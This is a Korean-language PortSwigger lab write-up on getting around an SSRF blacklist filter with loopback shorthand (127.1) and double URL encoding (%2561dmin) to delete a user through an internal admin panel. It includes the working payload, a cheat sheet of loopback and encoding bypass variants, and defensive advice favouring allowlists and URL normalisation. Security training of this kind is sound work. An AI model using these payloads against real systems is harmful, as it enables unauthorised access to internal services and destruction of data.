# Lab: SSRF with blacklist-based input filter

## 개요

- **난이도**: Practitioner
- **주제**: SSRF — 블랙리스트 우회 / loopback 축약형 / 더블 URL 인코딩
- **링크**: https://portswigger.net/web-security/ssrf/lab-ssrf-with-blacklist-filter

## 목표

`stockApi` 파라미터에 블랙리스트 필터가 적용되어 `127.0.0.1`, `localhost`, `/admin` 이 차단된다. loopback 축약 표기(`127.1`)와 경로 더블 인코딩(`%2561dmin`)으로 우회해 admin 패널에 접근하고 carlos 를 삭제한다.

## 001~002 랩과의 차이

```
[001~002 랩 — 필터 없음]
  stockApi=http://localhost/admin → 그대로 통과

[004 랩 (이번) — 블랙리스트 필터]
  stockApi=http://127.0.0.1/admin → 차단 (127.0.0.1 감지)
  stockApi=http://localhost/admin  → 차단 (localhost 감지)
  stockApi=http://127.1/admin      → 차단 (/admin 감지)
  stockApi=http://127.1/%61dmin    → 차단 (a 디코딩 후 admin 감지?)
  stockApi=http://127.1/%2561dmin  → 통과! (더블 인코딩 우회)
```

## 우회 기법 1 — loopback 축약형

### IPv4 주소 표기 규칙

```
표준 IPv4: 4개의 옥텟을 점으로 구분
  127.0.0.1

하지만 많은 OS/라이브러리가 축약 표기를 허용:

옥텟 생략 규칙:
  생략된 옥텟은 0 으로 채워짐 (오른쪽부터)
  또는 마지막 부분을 32비트 정수로 해석

  127.0.0.1  →  4옥텟 표준
  127.0.1    →  3옥텟: 127.0.0.1 과 동일
  127.1      →  2옥텟: 127.0.0.1 과 동일  ← 이번 랩 사용
  2130706433 →  1옥텟(10진수): 127.0.0.1 (127×2²⁴ + 1)
```

### loopback 대체 표현 종합

```
[옥텟 축약]
  127.0.0.1      표준
  127.0.1        3옥텟
  127.1          2옥텟  ← 이번 랩
  0              일부 OS 에서 0.0.0.0 → loopback

[진수 변환]
  2130706433     10진수  (127×16777216 + 1)
  0x7f000001     16진수
  0177.0.0.1     8진수 (앞에 0)
  0x7f.0x0.0x0.0x1  혼합 16진수

[IPv6]
  [::1]                  IPv6 loopback
  [0:0:0:0:0:0:0:1]     IPv6 전체 표기
  [::ffff:127.0.0.1]    IPv4-mapped IPv6
  [::ffff:7f00:1]       IPv4-mapped 16진수

[호스트명]
  localhost              표준 호스트명
  LOCALHOST              대소문자 무시
  localtest.me           DNS → 127.0.0.1 반환하는 공개 도메인
  127.0.0.1.nip.io       nip.io 서비스 (IP를 도메인으로)
  spoofed.attacker.com   DNS 리바인딩으로 127.0.0.1 반환

[특수]
  0.0.0.0                일부 컨텍스트에서 loopback 동작
  000.000.000.000        선행 0 (일부 파서 허용)
```

## 우회 기법 2 — 더블 URL 인코딩

### URL 인코딩 기초

```
URL 인코딩 (Percent-encoding):
  특수문자를 %XX 형태로 인코딩
  XX = 문자의 ASCII 16진수

예:
  a → %61  (0x61 = 97 = 'a')
  % → %25  (0x25 = 37 = '%')
  / → %2F
```

### 단일 인코딩 vs 더블 인코딩

```
[단일 인코딩]
  /admin
  → a 를 인코딩: /%61dmin
  → 서버 디코딩: /admin → 블랙리스트 감지 → 차단

  흐름:
    클라이언트: /%61dmin 전송
    WAF/필터:   /%61dmin 디코딩 → /admin 감지 → 차단

[더블 인코딩]
  /admin
  → a 를 인코딩: /%61dmin
  → % 를 다시 인코딩: /%2561dmin  (%25 = '%')
  → 서버 1차 디코딩: /%61dmin → "admin" 없음 → 통과!
  → 백엔드 2차 디코딩: /admin → 실행

  흐름:
    클라이언트: /%2561dmin 전송
    WAF/필터:   /%2561dmin 디코딩 → /%61dmin → "admin" 없음 → 통과
    백엔드:     /%61dmin 디코딩 → /admin → 실행!
```

### 더블 인코딩이 가능한 조건

```
디코딩 주체가 두 곳 이상일 때:
  WAF/필터 → 1회 디코딩 후 검사
  백엔드   → 다시 1회 디코딩 후 처리

→ WAF 와 백엔드의 디코딩 횟수 차이를 이용
→ WAF 는 한 번만 디코딩 → 우회
→ 백엔드는 두 번 디코딩 → 실행
```

## 공격 페이로드

```
최종 페이로드:
  stockApi=http://127.1/%2561dmin

단계별 구성:
  1. loopback: 127.0.0.1 → 127.1 (블랙리스트 우회)
  2. 경로: /admin → /%61dmin → /%2561dmin (더블 인코딩)

carlos 삭제:
  stockApi=http://127.1/%2561dmin/delete?username=carlos
```

## 블랙리스트 방어의 한계

```
블랙리스트 방식:
  차단 목록: 127.0.0.1, localhost, /admin, 169.254...
  → 목록에 없는 표현은 통과

문제:
  loopback 표현이 수십 가지 → 모두 나열 불가
  인코딩 우회 변형이 다양 → 모두 탐지 불가
  신규 우회 기법 발견 시 즉시 취약

화이트리스트 방식 (권장):
  허용 목록만 통과:
    허용: https://stock.weliketoshop.net/...
    차단: 목록에 없는 모든 URL
  → loopback 변형 우회 불가
  → 인코딩 우회 불가 (URL 파싱 후 정규화해서 비교)

URL 정규화 비교:
  입력: http://127.1/%2561dmin
  정규화: http://127.0.0.1/admin
  → 정규화된 값을 화이트리스트와 비교
  → 일치하는 항목 없음 → 차단
```

## 핵심 정리

- 블랙리스트 필터는 loopback 의 다양한 표기(`127.1`, `2130706433`, `0x7f000001` 등)를 모두 열거할 수 없어 우회에 취약하다.
- 더블 URL 인코딩(`%2561dmin`)은 WAF 와 백엔드의 디코딩 횟수 차이를 이용해 필터를 통과한다.
- **블랙리스트는 근본 해결책이 아니다** — URL 파싱 후 정규화된 값을 화이트리스트와 비교하는 방식이 올바른 방어다.

## 배운 점 및 추가 학습

### 1. loopback 표현 빠른 참조

| 표현 | 유형 | 비고 |
|------|------|------|
| `127.0.0.1` | 표준 IPv4 | 기본 차단 대상 |
| `127.1` | 옥텟 축약 | 2옥텟 |
| `127.0.1` | 옥텟 축약 | 3옥텟 |
| `2130706433` | 10진수 | 127×2²⁴+1 |
| `0x7f000001` | 16진수 | 앞에 0x |
| `0177.0.0.1` | 8진수 | 앞에 0 |
| `[::1]` | IPv6 | 브라켓 필요 |
| `[::ffff:127.0.0.1]` | IPv4-mapped | IPv6 형태 |
| `localhost` | 호스트명 | 대소문자 변형 가능 |
| `localtest.me` | 공개 DNS | → 127.0.0.1 |
| `0.0.0.0` | 특수 | 일부 환경 |
| `0` | 1옥텟 | 일부 환경 |

### 2. 인코딩 우회 변형

```
/admin 우회 패턴:

단일 인코딩:
  /%61dmin      (a → %61)
  /adm%69n      (i → %69)
  /admi%6e      (n → %6e)
  /ADMIN        (대소문자, 경로 대소문자 무시 서버)

더블 인코딩:
  /%2561dmin    (%61 의 % → %25)
  /adm%2569n    (%69 의 % → %25)

유니코드/UTF-8:
  /%c0%61dmin   (과도한 UTF-8 인코딩, 구형 파서)
```

### 3. 블랙리스트 vs 화이트리스트

```
[블랙리스트]  차단할 것을 나열
  + 구현 단순
  - 우회 가능 (새로운 표현 추가 시 뚫림)
  - 유지보수 비용 높음

[화이트리스트]  허용할 것만 나열
  + 우회 어려움 (목록에 없으면 기본 차단)
  - 유연성 낮음 (새 서비스 추가 시 명시 필요)
  ✓ SSRF 방어에 권장

[정규화 + 화이트리스트]
  URL 파싱 → IP 해석 → 정규화 → 비교
  http://127.1/%2561dmin
  → IP: 127.0.0.1 (loopback 차단)
  → 경로: /admin (화이트리스트 미일치)
  → 차단
```
